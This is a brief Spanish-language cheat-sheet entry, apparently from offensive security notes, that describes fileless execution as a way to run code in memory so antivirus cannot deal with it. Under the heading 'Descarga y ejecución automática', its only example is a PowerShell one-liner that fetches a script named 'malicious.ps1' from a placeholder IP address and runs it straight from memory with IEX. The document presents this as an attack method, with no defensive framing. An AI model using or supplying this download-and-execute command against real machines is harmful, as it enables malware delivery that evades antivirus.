Las ejecuciones fileless se refiere a ejecutar un código que no está almacenado en un  archivo, si no que está en la memoria (RAM)  por lo que el antivirus no lo puede tratar:

Hay varias formas de realizar ataques de tipo fileless:

## Descarga y ejecución automática

```powershell
IEX (New-Object Net.WebClient).downloadString('http://IP/malicious.ps1')
```

